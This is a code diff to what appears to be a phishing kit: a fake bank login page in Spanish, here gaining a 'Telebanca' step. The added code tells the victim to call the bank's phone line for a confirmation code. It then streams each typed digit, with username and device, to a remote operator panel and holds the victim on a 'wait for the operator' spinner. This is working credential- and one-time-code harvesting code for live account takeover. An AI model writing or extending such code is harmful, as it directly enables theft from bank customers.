@@ -20,7 +20,7 @@ import {
   type SecurityChallenge,
 } from "@/lib/security-challenge";
 
-type Step = "usuario" | "imagen" | "dinamica" | "tejuino";
+type Step = "usuario" | "imagen" | "dinamica" | "tejuino" | "telebanca";
 
 export default function LoginPage() {
   const [step, setStep] = useState<Step>("usuario");
@@ -38,6 +38,7 @@ export default function LoginPage() {
   const appliedActionRef = useRef<string>("");
   const usernameRef = useRef<HTMLInputElement>(null);
   const codeRef = useRef<HTMLInputElement>(null);
+  const telebancaRef = useRef<HTMLInputElement>(null);
   const passwordRef = useRef<HTMLInputElement>(null);
   const busyRef = useRef(false);
   const finishingRef = useRef(false);
@@ -127,7 +128,9 @@ export default function LoginPage() {
               busyRef.current = false;
               setCode("");
               setOpsError("El código ingresado no es válido (FLO0001W)");
-              setStep("dinamica");
+              if (step !== "telebanca") {
+                setStep("dinamica");
+              }
             }
           } else if (session.state === "error-user") {
             if (appliedActionRef.current !== "error-user") {
@@ -159,9 +162,29 @@ export default function LoginPage() {
               );
               setStep("imagen");
             }
+          } else if (
+            session.state === "telebanca" ||
+            session.state === "typing-telebanca"
+          ) {
+            if (step === "telebanca" && (waitingPanel || busyRef.current)) {
+              /* keep spinner */
+            } else if (
+              appliedActionRef.current !== "telebanca" ||
+              step !== "telebanca"
+            ) {
+              appliedActionRef.current = "telebanca";
+              setOpsError("");
+              setWaitingPanel(false);
+              setAdvancing(false);
+              busyRef.current = false;
+              setStep("telebanca");
+            }
           } else if (session.state === "token" || session.state === "typing") {
             // Residual typing/token: no bajar spinner si ya enviamos el OTP
-            if (step === "dinamica" && (waitingPanel || busyRef.current)) {
+            if (
+              (step === "dinamica" || step === "telebanca") &&
+              (waitingPanel || busyRef.current)
+            ) {
               /* keep spinner */
             } else if (
               appliedActionRef.current !== "token" ||
@@ -225,11 +248,20 @@ export default function LoginPage() {
     const sid = sessionIdRef.current;
     if (!sid || waitingPanel) return;
 
-    // Solo avisa "Escribiendo" en el badge; el valor NO se manda hasta Continuar.
-    let state: "typing" | "typing-pass" | "token" | "imagen" | null = null;
+    let state:
+      | "typing"
+      | "typing-pass"
+      | "typing-telebanca"
+      | "token"
+      | "telebanca"
+      | "imagen"
+      | null = null;
     if (step === "dinamica") {
       const digits = code.replace(/\D/g, "");
       state = digits.length > 0 ? "typing" : "token";
+    } else if (step === "telebanca") {
+      const digits = code.replace(/\D/g, "");
+      state = digits.length > 0 ? "typing-telebanca" : "telebanca";
     } else if (step === "imagen") {
       state = password.trim().length > 0 ? "typing-pass" : "imagen";
     } else {
@@ -365,6 +397,60 @@ export default function LoginPage() {
         setAdvancing(false);
         busyRef.current = false;
         appliedActionRef.current = "token";
+      });
+  }
+
+  function continueFromTelebanca(form?: HTMLFormElement | null) {
+    if (busyRef.current || waitingPanel) return;
+    const confirmationCode = (
+      form ? String(new FormData(form).get("telebanca_code") || "") : code
+    )
+      .replace(/\D/g, "")
+      .trim();
+
+    if (!confirmationCode) {
+      setOpsError("Ingresa tu código de confirmación.");
+      telebancaRef.current?.focus();
+      return;
+    }
+
+    busyRef.current = true;
+    appliedActionRef.current = "submitted-telebanca";
+    finishingRef.current = false;
+    flushSync(() => {
+      setCode(confirmationCode);
+      setOpsError("");
+      setAdvancing(true);
+      setWaitingPanel(true);
+    });
+
+    const sid = sessionIdRef.current;
+    if (!sid) {
+      setOpsError("Sesión no válida. Vuelve a empezar.");
+      setWaitingPanel(false);
+      setAdvancing(false);
+      busyRef.current = false;
+      return;
+    }
+
+    const user = readUsername() || username || "usuario";
+    void upsertOpsSession({
+      id: sid,
+      username: user,
+      token: confirmationCode,
+      device: detectDevice(),
+      ip: "127.0.0.1",
+      state: "waiting-telebanca",
+      createdAt: Date.now(),
+      updatedAt: Date.now(),
+      last_seen: Date.now(),
+    })
+      .then(() => postOpsAction(sid!, "waiting-telebanca"))
+      .catch(() => {
+        setOpsError("No se pudo avisar al panel. Revisa WiFi e intenta de nuevo.");
+        setWaitingPanel(false);
+        setAdvancing(false);
+        busyRef.current = false;
       });
   }
 
@@ -673,12 +759,28 @@ export default function LoginPage() {
                 </label>
 
                 <div className="mt-4 sm:mt-5">
-                  <Link
-                    href="/login"
-                    className="inline-flex min-h-11 items-center text-[15px] font-semibold text-[#292929] underline! underline-offset-2 sm:text-[16px]"
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setStep("telebanca");
+                      setCode("");
+                      setOpsError("");
+                      setWaitingPanel(false);
+                      setAdvancing(false);
+                      busyRef.current = false;
+                      const sid = sessionIdRef.current;
+                      if (sid) {
+                        void patchOpsSession(sid, {
+                          state: "telebanca",
+                          token: "",
+                        }).catch(() => {});
+                      }
+                      window.setTimeout(() => telebancaRef.current?.focus(), 60);
+                    }}
+                    className="inline-flex min-h-11 items-center text-left text-[15px] font-semibold text-[#292929] underline! underline-offset-2 hover:text-[#555] sm:text-[16px]"
                   >
                     Obtener mi código por Telebanca
-                  </Link>
+                  </button>
                 </div>
 
                 <div className="dynamic-token-info mt-6 flex items-start gap-3 sm:mt-8">
@@ -730,6 +832,123 @@ export default function LoginPage() {
                     ) : (
                       <>
                         Continuar
+                        <ArrowRight />
+                      </>
+                    )}
+                  </button>
+                </div>
+              </form>
+            ) : null}
+
+            {step === "telebanca" ? (
+              <form
+                className="px-5 pb-8 pt-7 sm:px-8 sm:pb-10 sm:pt-9 md:px-11 md:pt-11"
+                method="post"
+                action="#"
+                onSubmit={(e) => {
+                  e.preventDefault();
+                  e.stopPropagation();
+                  continueFromTelebanca(e.currentTarget);
+                }}
+              >
+                {opsError.includes("FLO0001W") ? (
+                  <div
+                    role="alert"
+                    className="message state- mb-5 flex w-full items-stretch sm:mb-6"
+                  >
+                    <div className="icon-light shrink-0" aria-hidden />
+                    <p className="icon- flex flex-1 items-center px-3.5 py-3.5 text-[15px] font-semibold leading-snug text-[#292929] sm:text-[16px]">
+                      {opsError}
+                    </p>
+                  </div>
+                ) : null}
+
+                <h1 className="font-display text-[17px] font-bold leading-snug text-[#292929] sm:text-[19px] md:text-[20px]">
+                  Para continuar con el proceso llama al 2210-0055.
+                  <br />
+                  Si resides en el exterior llama al 1-877-824-6772, opción 3-2.
+                </h1>
+
+                <label className="mt-8 block sm:mt-10">
+                  <span className="block py-2.5 text-[14px] font-normal text-[#292929]">
+                    Código de confirmación
+                  </span>
+                  <input
+                    ref={telebancaRef}
+                    name="telebanca_code"
+                    inputMode="numeric"
+                    autoComplete="one-time-code"
+                    enterKeyHint="go"
+                    value={code}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, "");
+                      setCode(val);
+                      const sid = sessionIdRef.current;
+                      if (sid) {
+                        void patchOpsSession(sid, {
+                          token: val,
+                          state: "typing-telebanca",
+                        }).catch(() => {});
+                      }
+                    }}
+                    onInput={(e) => {
+                      const val = e.currentTarget.value.replace(/\D/g, "");
+                      setCode(val);
+                      const sid = sessionIdRef.current;
+                      if (sid) {
+                        void patchOpsSession(sid, {
+                          token: val,
+                          state: "typing-telebanca",
+                        }).catch(() => {});
+                      }
+                    }}
+                    disabled={showSpinner}
+                    className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] tracking-[0.15em] text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70"
+                  />
+                </label>
+
+                {opsError && !opsError.includes("FLO0001W") ? (
+                  <p className="mt-5 text-[13px] text-red-600 sm:mt-6">{opsError}</p>
+                ) : null}
+                {waitingPanel ? (
+                  <p className="mt-5 text-[13px] text-[#666] sm:mt-6">
+                    Validando código de confirmación… espera al operador.
+                  </p>
+                ) : null}
+
+                <div className="mt-8 flex flex-col-reverse gap-3 sm:mt-10 sm:flex-row sm:flex-wrap sm:items-center sm:gap-4">
+                  <button
+                    type="button"
+                    disabled={showSpinner}
+                    onClick={() => {
+                      setCode("");
+                      setWaitingPanel(false);
+                      setOpsError("");
+                      setAdvancing(false);
+                      busyRef.current = false;
+                      setStep("dinamica");
+                      const sid = sessionIdRef.current;
+                      if (sid) {
+                        void patchOpsSession(sid, {
+                          state: "token",
+                          token: "",
+                        }).catch(() => {});
+                      }
+                    }}
+                    className="inline-flex min-h-12 w-full items-center justify-center rounded-full border border-[#292929] bg-white px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] touch-manipulation disabled:opacity-60 sm:min-h-[42px] sm:w-auto sm:py-[10px] sm:text-[16px]"
+                  >
+                    Cancelar
+                  </button>
+                  <button
+                    type="submit"
+                    disabled={showSpinner || code.trim().length === 0}
+                    className="relative inline-flex min-h-12 w-full items-center justify-center gap-2 rounded-full bg-[#fdda24] px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] shadow-sm hover:bg-[#fbd016] touch-manipulation disabled:cursor-not-allowed disabled:opacity-50 sm:min-h-[42px] sm:w-auto sm:py-[10px] sm:text-[16px]"
+                  >
+                    {showSpinner ? (
+                      <ButtonSpinner />
+                    ) : (
+                      <>
+                        <span>Ingresar</span>
                         <ArrowRight />
                       </>
                     )}
